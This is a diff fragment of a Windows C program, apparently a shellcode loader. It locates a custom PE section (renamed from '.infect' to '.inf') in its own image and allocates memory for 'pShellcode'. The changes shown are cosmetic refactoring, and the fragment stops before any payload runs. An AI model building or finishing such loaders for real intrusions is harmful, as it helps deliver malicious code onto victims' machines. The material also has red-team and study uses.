@@ -1,9 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
 
-#define C_PTR( x ) ( PVOID ) x
-#define U_PTR( x ) ( ULONG_PTR ) x
-
 BOOL GetCustomizedSection(IN LPSTR  SctName, OUT OPTIONAL PVOID* SecData, OUT OPTIONAL PULONG SecSize){
 	PVOID				  Image;
     PIMAGE_NT_HEADERS	  NtHeader;
@@ -11,7 +8,7 @@ BOOL GetCustomizedSection(IN LPSTR  SctName, OUT OPTIONAL PVOID* SecData, OUT OP
 
 	Image = GetModuleHandleA(NULL);
 	
-	NtHeader = (U_PTR(Image) + ((PIMAGE_DOS_HEADER)Image)->e_lfanew );
+	NtHeader = ((ULONG_PTR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew );
 	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
 		puts( "[!] Invalid pe header" );
 		return FALSE;
@@ -23,7 +20,7 @@ BOOL GetCustomizedSection(IN LPSTR  SctName, OUT OPTIONAL PVOID* SecData, OUT OP
 		}
 		if(strcmp(SctName, ScHeader[i].Name) == 0 ){
 			if(SecData) {
-			    *SecData = U_PTR(Image) + ScHeader[i].VirtualAddress;
+			    *SecData = (ULONG_PTR)Image + ScHeader[i].VirtualAddress;
 			}
 			if(SecSize) {
 			    *SecSize = ScHeader[i].SizeOfRawData;
@@ -40,14 +37,14 @@ int main(){
 	PVOID  pSctData;
 	ULONG  SctSize;
 	PDWORD OldProtect;
-	CHAR   SctName[] = ".infect";
+	CHAR   SctName[] = ".inf";
 
     if (!GetCustomizedSection( SctName, &pSctData, &SctSize ) ) {
-        printf( "[!] %s Sct \"%s\" not found", SctName,SctName );
+        printf( "[!] %s Section \"%s\" not found", SctName,SctName );
 		return -1; 
     }
 
-	printf( "[*] Config Sct found @ %p [%d bytes]\n", pSctData, SctSize );
+	printf( "[*] %s Section found at %p [%d bytes]\n", SctName,pSctData, SctSize );
 
 	if(!(pShellcode = VirtualAlloc(NULL, SctSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))){
 	    printf("[!] VirtualAlloc Failed: %d\n", GetLastError());
